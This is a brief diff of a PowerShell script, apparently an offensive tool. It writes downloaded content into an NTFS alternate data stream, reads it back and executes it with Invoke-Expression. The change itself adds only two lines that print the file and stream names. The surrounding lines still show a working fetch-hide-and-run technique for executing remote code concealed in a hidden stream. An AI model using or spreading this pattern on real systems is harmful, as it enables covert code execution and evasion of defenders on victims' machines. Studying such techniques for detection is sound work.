@@ -54,4 +54,7 @@ The script needs to be ran . sourced for the time being as there is an issue whe
 
   Add-Content -Encoding Byte -Path $file -Value $request.Content -Stream $ads
   $adspayload = Get-Content -Path $file -Stream $ads -Raw
+
+  Write-Host 'The file created by this script is: ' $file
+  Write-Host 'The Stream name created is: ' $ads
   Invoke-Expression -command $adspayload
